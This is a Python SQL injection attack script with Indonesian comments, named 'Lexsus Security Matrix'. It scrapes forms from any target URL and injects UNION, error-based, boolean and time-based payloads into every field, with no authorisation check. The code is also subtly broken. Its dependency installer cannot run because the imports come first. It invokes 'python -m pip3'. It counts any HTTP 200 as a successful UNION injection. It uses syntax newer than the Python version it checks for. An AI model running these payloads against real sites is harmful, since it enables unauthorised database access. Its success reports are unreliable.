#!/usr/bin/env python3
import os
import sys
import time
import argparse
import requests
import subprocess
import importlib.util
from urllib.parse import urljoin
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

# Inisialisasi Colorama
init(autoreset=True)

# Konfigurasi
REQUIRED_PACKAGES = {
    'requests': 'requests',
    'beautifulsoup4': 'bs4',
    'colorama': 'colorama',
    'argparse': 'argparse'
}

class DependencyManager:
    @staticmethod
    def check_dependencies():
        missing = []
        for pkg_name, import_name in REQUIRED_PACKAGES.items():
            if not importlib.util.find_spec(import_name):
                missing.append(pkg_name)
        return missing

    @staticmethod
    def install_dependencies(missing):
        print(f"\n{Fore.YELLOW}[!] Memerlukan dependensi: {', '.join(missing)}")
        print(f"{Fore.CYAN}[+] Mencoba instalasi otomatis...{Style.RESET_ALL}")
        
        try:
            # Deteksi pip dengan cara lebih kompatibel
            pip = 'pip3' if subprocess.run(
                ['which', 'pip3'], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            ).returncode == 0 else 'pip'

            for pkg in missing:
                # Gunakan perintah yang lebih kompatibel
                result = subprocess.run(
                    [sys.executable, '-m', pip, 'install', pkg],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                if result.returncode == 0:
                    print(f"{Fore.GREEN}[✓] {pkg} terinstal{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Gagal menginstal {pkg}")
                    print(f"Error: {result.stderr}")
                    if "Permission denied" in result.stderr:
                        print(f"{Fore.YELLOW}Coba gunakan sudo atau virtual environment{Style.RESET_ALL}")
                    return False
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Kesalahan sistem: {str(e)}{Style.RESET_ALL}")
            return False

class AdvancedSQLiScanner:
    def __init__(self, target):
        if not target.startswith(('http://', 'https://')):
            raise ValueError("URL harus dimulai dengan http:// atau https://")
            
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        self.payloads = {
            'in_band': {
                'union': "' UNION SELECT {cols}-- ",
                'error': "' AND 1=CONVERT(int, (SELECT @@version))-- "
            },
            'inferential': {
                'boolean': "' AND ASCII(SUBSTRING((SELECT USER()),1,1))>{guess}-- ",
                'time': "' AND IF(1=1,SLEEP(5),0)-- "
            }
        }

    def scan_forms(self):
        try:
            res = self.session.get(self.target, timeout=15)
            res.raise_for_status()
            
            if 'text/html' not in res.headers.get('Content-Type', ''):
                print(f"{Fore.YELLOW}[-] Respons bukan HTML{Style.RESET_ALL}")
                return []
                
            soup = BeautifulSoup(res.text, 'html.parser')
            return soup.find_all('form')
            
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            return []

    def test_payload(self, form, payload):
        try:
            form_action = form.get('action', self.target)
            form_method = form.get('method', 'get').lower()
            url = urljoin(self.target, form_action)
            
            data = {}
            for inp in form.find_all('input'):
                if (name := inp.get('name')):
                    data[name] = inp.get('value', '') + payload

            if form_method == 'post':
                response = self.session.post(url, data=data, timeout=20)
            else:
                response = self.session.get(url, params=data, timeout=20)
                
            return response
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Koneksi error: {e}{Style.RESET_ALL}")
            return None

    def union_attack(self):
        print(f"\n{Fore.CYAN}[+] Memulai Union-based SQLi Scan{Style.RESET_ALL}")
        forms = self.scan_forms()
        if not forms:
            print(f"{Fore.YELLOW}[-] Tidak ada form ditemukan{Style.RESET_ALL}")
            return
            
        for form in forms:
            print(f"{Fore.BLUE}[*] Testing form: {form.get('action')}{Style.RESET_ALL}")
            for cols in range(1, 10):
                try:
                    payload = self.payloads['in_band']['union'].format(
                        cols=','.join(['NULL']*cols)
                    )
                    res = self.test_payload(form, payload)
                    if res and res.status_code == 200:
                        print(f"{Fore.GREEN}[!] Union berhasil dengan {cols} kolom{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error payload: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Lexsus Security Matrix')
    parser.add_argument('target', help='URL target')
    args = parser.parse_args()

    try:
        # Periksa dependensi
        missing = DependencyManager.check_dependencies()
        if missing and not DependencyManager.install_dependencies(missing):
            sys.exit(1)
            
        scanner = AdvancedSQLiScanner(args.target)
        scanner.union_attack()
        
    except ValueError as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan dihentikan{Style.RESET_ALL}")
        sys.exit()

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        print(f"{Fore.RED}Membutuhkan Python 3.6+{Style.RESET_ALL}")
        sys.exit(1)
    
    main()